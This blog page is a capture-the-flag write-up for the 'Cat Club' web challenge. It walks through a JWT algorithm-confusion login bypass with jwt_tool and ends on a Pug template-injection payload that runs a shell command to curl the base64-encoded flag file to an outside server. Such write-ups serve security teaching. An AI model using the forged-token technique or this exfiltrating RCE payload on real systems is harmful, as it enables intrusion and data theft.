<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content="light dark" name=color-scheme><title>1337up ctf catclub writeup</title><link href=/img/favicon-32x32.png rel=icon sizes=32x32 type=image/png><link href=/img/favicon-16x16.png rel=icon sizes=16x16 type=image/png><link href=/img/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><style>@font-face {font-display:swap;font-family:JetBrains Mono;font-style:normal;font-weight:400;src:url("/fonts/jetbrains-mono-v20-latin-regular.woff2") format("woff2")}</style><style>body{--primary-color:#5871a2;--primary-pale-color:#5871a210;--text-color:#3c4043;--text-pale-color:#94969f;--bg-color:#fff;--highlight-mark-color:#5f75b035;--callout-note-color:#5871a2;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460;--main-font:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,
      "Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,
      "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol",
      "Noto Color Emoji";--code-font:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,
      "Liberation Mono","Courier New",monospace;--homepage-max-width:768px;--main-max-width:768px;--avatar-size:125px;--icon-size:20px;--homepage-font-size:16px;--homepage-line-height:1.75;--paragraph-font-size:16px;--paragraph-line-height:1.75;--aside-font-size:15px;--img-border-radius:4px;--callout-border-radius:0;--detail-border-radius:0;--dark-mode-img-brightness:.75;--dark-mode-chart-brightness:.75;--inline-code-border-radius:2px;--inline-code-bg-color:var(--primary-pale-color);--block-code-border-radius:0;--block-code-border-color:var(--primary-color);--detail-border-color:var(--primary-color)}body.dark{--primary-color:#5d77ac;--primary-pale-color:#5d77ac20;--text-color:#9197a5;--text-pale-color:#747983;--bg-color:#202124;--highlight-mark-color:#5f75b035;--callout-note-color:#5d77ac;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}</style><link href=/main.css rel=stylesheet><script data-website-id=ade60e13-6907-4f1c-8a75-7c45b57b43d3 defer src=https://umami-phi-eight.vercel.app/script.js></script><body class=post><script>const theme=sessionStorage.getItem('theme');const match=window.matchMedia("(prefers-color-scheme: dark)").matches;if(theme&&theme=='dark'||!theme&&match){document.body.classList.add('dark');const a=document.querySelector('link#hl');if(a)a.href='/hl-dark.css'}</script><header class=blur><div id=header-wrapper><nav><a class=instant href=/>curtain</a><span class=separator>::</span><a class=instant href=/posts>blog</a></nav><div id=btns><button aria-label="theme switch" data-moon-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>' data-sun-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>' id=theme-toggle><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill=currentColor></path></svg></button><button aria-label="table of content" id=toc-toggle><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 4H21V6H3V4ZM3 11H15V13H3V11ZM3 18H21V20H3V18Z" fill=currentColor></path></svg></button></div></div></header><div id=wrapper><div id=blank></div><aside><nav><ul><li><a class=h2 href=#description>Description</a> <ul><li><a class=h3 href=#recon>Recon</a><li><a class=h3 href=#expolit>Expolit</a><li><a class=h3 href=#solution>Solution</a></ul></ul></nav><button aria-label="back to top" id=back-to-top><svg viewbox="0 0 24 24" height=24 width=24 xmlns=http://www.w3.org/2000/svg><path d="M11.9997 10.8284L7.04996 15.7782L5.63574 14.364L11.9997 8L18.3637 14.364L16.9495 15.7782L11.9997 10.8284Z" fill=currentColor></path></svg></button></aside><main><div><div data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' id=copy-cfg style=display:none></div><article data-backlink-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M9.41421 8L18.0208 16.6066L16.6066 18.0208L8 9.41421V17H6V6H17V8H9.41421Z" fill="currentColor"></path></svg>' class=prose><h1>1337up ctf catclub writeup</h1><div id=post-info><div id=date><span id=publish>2024-11-19</span></div><div id=tags><a class=instant href=https://curtainp.github.io/tags/ctf><span>#</span>CTF</a><a class=instant href=https://curtainp.github.io/tags/web><span>#</span>Web</a><a class=instant href=https://curtainp.github.io/tags/jwt><span>#</span>JWT</a><a class=instant href=https://curtainp.github.io/tags/ssti><span>#</span>SSTI</a></div></div><h1 id=description>Description<a aria-label="Anchor link for: description" class=zola-anchor href=#description style=visibility:hidden></a></h1><figure><img alt="Cat Club" loading=lazy src=./2024-11-19_15-38.png><figcaption>Cat Club</figcaption></figure><h2 id=recon>Recon<a aria-label="Anchor link for: recon" class=zola-anchor href=#recon style=visibility:hidden></a></h2><p>Here we have source code and URL. After some investigation, we can find that there is only a <strong>login/register</strong> endpoint here, which may help us in our next move.<figure><img alt="login endpoint" loading=lazy src=./2024-11-19_15-44.png><figcaption>login endpoint</figcaption></figure><p>We register with a random account <code>hacker123</code> and login in. Now, we see four very cute cats and a title with our registered username, <strong>and since the username is displayed directly as is, we can guess that there may be injection-related vulnerabilities</strong>.<figure><img alt=logined loading=lazy src=./2024-11-19_15-55_1.png><figcaption>logined</figcaption></figure><p>And second interesting thing is that the request carries a JWT cookie.<figure><img alt=JWT loading=lazy src=./2024-11-19_16-06.png><figcaption>JWT</figcaption></figure><h2 id=expolit>Expolit<a aria-label="Anchor link for: expolit" class=zola-anchor href=#expolit style=visibility:hidden></a></h2><p>We already have the above findings in hand and now do a targeted search of the source code. Since this is a JavaScript project, we get the <code>package.json</code> to see its dependencies:<pre class=language-json data-lang=json style=background:#2e3440;color:#d8dee9><code class=language-json data-lang=json><span>{
</span><span>    </span><span style=color:#a3be8c>"name"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"cat-club"</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"version"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"4.2.0"</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"main"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"app/app.js"</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"scripts"</span><span style=color:#eceff4>: </span><span>{
</span><span>        </span><span style=color:#a3be8c>"start"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"node app/app.js"
</span><span>    }</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"dependencies"</span><span style=color:#eceff4>: </span><span>{
</span><span>        </span><span style=color:#a3be8c>"bcryptjs"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^2.4.3"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"cookie-parser"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^1.4.6"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"dotenv"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^16.4.5"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"pug"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^3.0.3"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"express"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^4.21.0"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"express-session"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^1.18.0"</span><span style=color:#eceff4>,
</span><mark style=background:#434c5e52><span>        </span><span style=color:#a3be8c>"json-web-token"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"~3.0.0"</span><span style=color:#eceff4>,
</span></mark><span>        </span><span style=color:#a3be8c>"pg"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^8.12.0"</span><span style=color:#eceff4>,
</span><span>        </span><span style=color:#a3be8c>"sequelize"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^6.37.3"
</span><span>    }</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"devDependencies"</span><span style=color:#eceff4>: </span><span>{
</span><span>        </span><span style=color:#a3be8c>"nodemon"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"^3.1.4"
</span><span>    }</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"engines"</span><span style=color:#eceff4>: </span><span>{
</span><span>        </span><span style=color:#a3be8c>"node"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>""
</span><span>    }</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"license"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"MIT"</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"keywords"</span><span style=color:#eceff4>: </span><span>[]</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"author"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>""</span><span style=color:#eceff4>,
</span><span>    </span><span style=color:#a3be8c>"description"</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>""
</span><span>}
</span></code></pre><p>Notice the highlighted line, which is dependency library of JWT handled in JavaScript, search it in <a rel="nofollow noreferrer" href=https://www.npmjs.com/search>npmjs</a>:<figure><img alt="npmjs search" loading=lazy src=./2024-11-19_16-26.png><figcaption>npmjs search</figcaption></figure><p>And there’s nothing strange about the usage. However, we quickly discovered a high-risk vulnerability on the security page.<figure><img alt="JWT Algorithm Confusion" loading=lazy src=./2024-11-19_16-26_1.png><figcaption>JWT Algorithm Confusion</figcaption></figure><p>We can learn more detail infomation about this vulnerability in <a rel="nofollow noreferrer" href=https://portswigger.net/web-security/jwt/algorithm-confusion>PortSwigger Academy</a>. After we have familiarized ourselves with how this vulnerability works, in order to expolit it.<p><strong>we need <code>public key</code> (in first request we can get orginal alg_type is RS256)</strong>.<p>Fortunately, the program has an endpoint that provides a public key.<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span>router</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#a3be8c>"/jwks.json"</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>async </span><span>(req</span><span style=color:#eceff4>, </span><span>res) </span><span style=color:#81a1c1>=> </span><span>{
</span><span>    </span><span style=color:#81a1c1>try </span><span>{
</span><span>        </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>publicKey </span><span style=color:#81a1c1>= await </span><span>fsPromises</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>readFile</span><span>(path</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>join</span><span>(__dirname</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>".."</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"public_key.pem"</span><span>)</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"utf8"</span><span>)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>publicKeyObj </span><span style=color:#81a1c1>= </span><span>crypto</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createPublicKey</span><span>(publicKey)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>publicKeyDetails </span><span style=color:#81a1c1>= </span><span>publicKeyObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>export</span><span>({ format</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"jwk" </span><span>})</span><span style=color:#eceff4>;
</span><span>
</span><span>        </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>jwk </span><span style=color:#81a1c1>= </span><span>{
</span><span>            kty</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"RSA"</span><span style=color:#eceff4>,
</span><span>            n</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>base64urlEncode</span><span>(</span><span style=color:#8fbcbb>Buffer</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>from</span><span>(publicKeyDetails</span><span style=color:#81a1c1>.</span><span>n</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"base64"</span><span>))</span><span style=color:#eceff4>,
</span><span>            e</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>base64urlEncode</span><span>(</span><span style=color:#8fbcbb>Buffer</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>from</span><span>(publicKeyDetails</span><span style=color:#81a1c1>.</span><span>e</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"base64"</span><span>))</span><span style=color:#eceff4>,
</span><span>            alg</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"RS256"</span><span style=color:#eceff4>,
</span><span>            use</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"sig"</span><span style=color:#eceff4>,
</span><span>        }</span><span style=color:#eceff4>;
</span><span>
</span><span>        res</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>json</span><span>({ keys</span><span style=color:#eceff4>: </span><span>[jwk] })</span><span style=color:#eceff4>;
</span><span>    } </span><span style=color:#81a1c1>catch </span><span>(err) {
</span><span>        res</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>status</span><span>(</span><span style=color:#b48ead>500</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>json</span><span>({ message</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>"Error generating JWK" </span><span>})</span><span style=color:#eceff4>;
</span><span>    }
</span><span>})</span><span style=color:#eceff4>;
</span></code></pre><pre class=language-sh data-lang=sh style=background:#2e3440;color:#d8dee9><code class=language-sh data-lang=sh><span style=color:#88c0d0>❯</span><span> curl https://catclub-0.ctf.intigriti.io/jwks.json </span><span style=color:#81a1c1>| </span><span style=color:#88c0d0>jq</span><span> .
</span><span>  </span><span style=color:#81a1c1>%</span><span> Total    </span><span style=color:#81a1c1>%</span><span> Received </span><span style=color:#81a1c1>%</span><span> Xferd  Average Speed   Time    Time     Time  Current
</span><span>                                 </span><span style=color:#88c0d0>Dload</span><span>  Upload   Total   Spent    Left  Speed
</span><span style=color:#88c0d0>100</span><span>   410  100   410    0     0    221      0  0:00:01  0:00:01 --:--:--   221
</span><span>{
</span><span>  </span><span style=color:#a3be8c>"keys"</span><span style=color:#88c0d0>:</span><span> [
</span><span>    {
</span><span>      </span><span style=color:#a3be8c>"kty"</span><span style=color:#88c0d0>: </span><span style=color:#a3be8c>"RSA"</span><span>,
</span><span>      </span><span style=color:#a3be8c>"n"</span><span style=color:#88c0d0>: </span><span style=color:#a3be8c>"w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw"</span><span>,
</span><span>      </span><span style=color:#a3be8c>"e"</span><span style=color:#88c0d0>: </span><span style=color:#a3be8c>"AQAB"</span><span>,
</span><span>      </span><span style=color:#a3be8c>"alg"</span><span style=color:#88c0d0>: </span><span style=color:#a3be8c>"RS256"</span><span>,
</span><span>      </span><span style=color:#a3be8c>"use"</span><span style=color:#88c0d0>: </span><span style=color:#a3be8c>"sig"
</span><span>    }
</span><span>  </span><span style=color:#88c0d0>]
</span><span>}
</span></code></pre><p>And we can transfer JWK to PEM format key with <a href="https://gchq.github.io/CyberChef/#recipe=JWK_to_PEM()&input=eyJrZXlzIjpbeyJrdHkiOiJSU0EiLCJuIjoidzRvUEV4LTQ0OFhRV0hfT3RTV044TDBOVURVLXJ2MWpNaUwwczRjbGN1eVZZdmdwU1Y3RnN2QUc2NUVuRWhYYVlwWWVNZjFHTW1VeEJjeVFPcGF0aEwxemYzX0prNUlzYmhFbXVVWjI4Q2NkOGwyZ09jVVJWRkEzajRxTXQzNE9sUHF6ZjluWEJ2bGpudFR1WmNRelljR0V0TTdTZDlzU21nOHVWeDhmMVdPbVVGQ2FxdEMyNkhkakJNbk5maG5MS1k5aVB4RlBHY0U4cWE4U3NyblJmVDVISmpTUnVfSm1HbFlDckZTb2Y1cF9FMFdQeUNVYkFWNXJmZ1RtMkNld0Y3dklQMW5lSTVqd2xjbTIyWDJ0OG9wVXJMYnJKWW9XRmVZWk9ZX1dyOXZaYjIzeG1tZ285OE9BYzVpY3N2enFZT0RRTEN4dzRoOUl4R0VtTVotSGR3IiwiZSI6IkFRQUIiLCJhbGciOiJSUzI1NiIsInVzZSI6InNpZyJ9XX0&oeol=CRLF" rel="nofollow noreferrer">CyberChef</a><figure><img alt="JWK to PEM" loading=lazy src=./2024-11-19_16-59.png><figcaption>JWK to PEM</figcaption></figure><p>Further, in the endpoint that returns the <code>Cats Gallery</code> after user has successfully loggedin, we can see that the username is also injected into the server-side template in advance in JWT.<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span>router</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#a3be8c>"/cats"</span><span style=color:#eceff4>, </span><span>getCurrentUser</span><span style=color:#eceff4>, </span><span>(req</span><span style=color:#eceff4>, </span><span>res) </span><span style=color:#81a1c1>=> </span><span>{
</span><span>    </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>!</span><span>req</span><span style=color:#81a1c1>.</span><span>user) {
</span><span>        </span><span style=color:#81a1c1>return </span><span>res</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>redirect</span><span>(</span><span style=color:#a3be8c>"/login?error=Please log in to view the cat gallery"</span><span>)</span><span style=color:#eceff4>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>templatePath </span><span style=color:#81a1c1>= </span><span>path</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>join</span><span>(__dirname</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"views"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"cats.pug"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>    fs</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>readFile</span><span>(templatePath</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"utf8"</span><span style=color:#eceff4>, </span><span>(err</span><span style=color:#eceff4>, </span><span>template) </span><span style=color:#81a1c1>=> </span><span>{
</span><span>        </span><span style=color:#81a1c1>if </span><span>(err) {
</span><span>            </span><span style=color:#81a1c1>return </span><span>res</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>render</span><span>(</span><span style=color:#a3be8c>"cats"</span><span>)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>typeof </span><span>req</span><span style=color:#81a1c1>.</span><span>user </span><span style=color:#81a1c1>!= </span><span style=color:#a3be8c>"undefined"</span><span>) {
</span><span>            template </span><span style=color:#81a1c1>= </span><span>template</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>replace</span><span>(</span><span style=color:#a3be8c>/</span><span style=color:#ebcb8b>guest</span><span style=color:#a3be8c>/</span><span style=color:#81a1c1>g</span><span style=color:#eceff4>, </span><span>req</span><span style=color:#81a1c1>.</span><span>user)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>
</span><mark style=background:#434c5e52><span>        </span><span style=color:#81a1c1>const </span><span style=font-weight:700;color:#d8dee9>html </span><span style=color:#81a1c1>= </span><span>pug</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>render</span><span>(template</span><span style=color:#eceff4>, </span><span>{
</span></mark><mark style=background:#434c5e52><span>            filename</span><span style=color:#eceff4>: </span><span>templatePath</span><span style=color:#eceff4>,
</span></mark><mark style=background:#434c5e52><span>            user</span><span style=color:#eceff4>: </span><span>req</span><span style=color:#81a1c1>.</span><span>user</span><span style=color:#eceff4>,
</span></mark><mark style=background:#434c5e52><span>        })</span><span style=color:#eceff4>;
</span></mark><span>
</span><span>        res</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span>(html)</span><span style=color:#eceff4>;
</span><span>    })</span><span style=color:#eceff4>;
</span><span>})</span><span style=color:#eceff4>;
</span></code></pre><blockquote class="callout tip"><div class=icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M9.97308 18H11V13H13V18H14.0269C14.1589 16.7984 14.7721 15.8065 15.7676 14.7226C15.8797 14.6006 16.5988 13.8564 16.6841 13.7501C17.5318 12.6931 18 11.385 18 10C18 6.68629 15.3137 4 12 4C8.68629 4 6 6.68629 6 10C6 11.3843 6.46774 12.6917 7.31462 13.7484C7.40004 13.855 8.12081 14.6012 8.23154 14.7218C9.22766 15.8064 9.84103 16.7984 9.97308 18ZM10 20V21H14V20H10ZM5.75395 14.9992C4.65645 13.6297 4 11.8915 4 10C4 5.58172 7.58172 2 12 2C16.4183 2 20 5.58172 20 10C20 11.8925 19.3428 13.6315 18.2443 15.0014C17.624 15.7748 16 17 16 18.5V21C16 22.1046 15.1046 23 14 23H10C8.89543 23 8 22.1046 8 21V18.5C8 17 6.37458 15.7736 5.75395 14.9992Z" fill=currentColor></path></svg></div><div class=content><p><strong>Tip</strong><p><a rel="nofollow noreferrer" href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs>hacktricks</a> have collected awesome lists for <code>SSTI</code></div></blockquote><h2 id=solution>Solution<a aria-label="Anchor link for: solution" class=zola-anchor href=#solution style=visibility:hidden></a></h2><ol><li>exploit <a rel="nofollow noreferrer" href=https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355>json-web-token algorithm-confusion</a> to bypass login in JWT verifying.<li>use <code>SSTI</code> to RCE.</ol><pre class=language-sh data-lang=sh style=background:#2e3440;color:#d8dee9><code class=language-sh data-lang=sh><span style=color:#88c0d0>❯</span><span> python3 jwt_tool.py --exploit k -pk </span><span style=color:#81a1c1>~</span><span>/Downloads/pubkey -I -pc username -pv </span><span style=color:#a3be8c>"#{7*7}" </span><span style=color:#81a1c1>$</span><span>JWT
</span><span>
</span><span>        </span><span style=color:#ebcb8b>\   \        \         \          \ </span><span>                   \</span><span style=background:#bf616a;color:#d8dee9> </span><span>
</span><span>   </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_   </span><span style=color:#81a1c1>|   |  </span><span style=color:#ebcb8b>\     </span><span style=color:#81a1c1>|</span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_</span><span>    __</span><span style=color:#81a1c1>| </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_</span><span>    __</span><span style=color:#81a1c1>|                    |
</span><span>         </span><span style=color:#81a1c1>|   |   </span><span style=color:#ebcb8b>\    </span><span style=color:#81a1c1>|      |          |       </span><span style=color:#ebcb8b>\         \     </span><span style=color:#81a1c1>|
</span><span>         </span><span style=color:#81a1c1>|        </span><span style=color:#ebcb8b>\   </span><span style=color:#81a1c1>|      |          |    </span><span style=color:#88c0d0>__  </span><span style=color:#ebcb8b>\ </span><span>    __  </span><span style=color:#ebcb8b>\    </span><span style=color:#81a1c1>|
</span><span>  </span><span style=color:#ebcb8b>\      </span><span style=color:#81a1c1>|      </span><span style=color:#88c0d0>_     </span><span style=color:#81a1c1>|      |          |   |     |   |     |   |
</span><span>   </span><span style=color:#81a1c1>|     |     </span><span style=color:#88c0d0>/ </span><span style=color:#ebcb8b>\    </span><span style=color:#81a1c1>|      |          |   |     |   |     |   |
</span><span style=color:#ebcb8b>\        </span><span style=color:#81a1c1>|    </span><span style=color:#88c0d0>/   </span><span style=color:#ebcb8b>\   </span><span style=color:#81a1c1>|      |          |</span><span style=color:#ebcb8b>\        </span><span style=color:#81a1c1>|</span><span style=color:#ebcb8b>\        </span><span style=color:#81a1c1>|   |
</span><span> </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_____/ </span><span style=color:#ebcb8b>\_</span><span>_/     </span><span style=color:#ebcb8b>\_</span><span>_</span><span style=color:#81a1c1>|   </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_</span><span style=color:#81a1c1>|      </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_</span><span style=color:#81a1c1>| </span><span style=color:#ebcb8b>\_</span><span style=color:#88c0d0>_____/  </span><span style=color:#ebcb8b>\_</span><span>_____/ </span><span style=color:#ebcb8b>\_</span><span>_</span><span style=color:#81a1c1>|
</span><span> </span><span style=color:#88c0d0>Version</span><span> 2.2.7                </span><span style=color:#ebcb8b>\_</span><span>_____</span><span style=color:#81a1c1>|             </span><span style=color:#88c0d0>@ticarpi      
</span><span>
</span><span style=color:#88c0d0>Original</span><span> JWT: 
</span><span>
</span><span style=color:#88c0d0>File</span><span> loaded: /home/ada/Downloads/pubkey
</span><span style=color:#88c0d0>jwttool_697a82c0d94b5cd145edc825ef911a2d</span><span> - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
</span><span>(</span><span style=color:#88c0d0>This</span><span> will only be valid on unpatched implementations of JWT.)
</span><span style=color:#88c0d0>[+]</span><span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7Nyo3fSJ9.lsLiuUrEkr81Z73IyAJmF7gTJfp9WwqErjPlr9e9UvI
</span></code></pre><p>Use this new JWT and reload the page, we see:<figure><img alt="SSTI Successful" loading=lazy src=./2024-11-19_17-20.png><figcaption>SSTI Successful</figcaption></figure><p>Now, change to real RCE payload:<pre class=language-sh data-lang=sh style=background:#2e3440;color:#d8dee9><code class=language-sh data-lang=sh><span style=color:#616e88>#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl &LTweb service>/?flag=$(cat /flag* | base64)')}()}
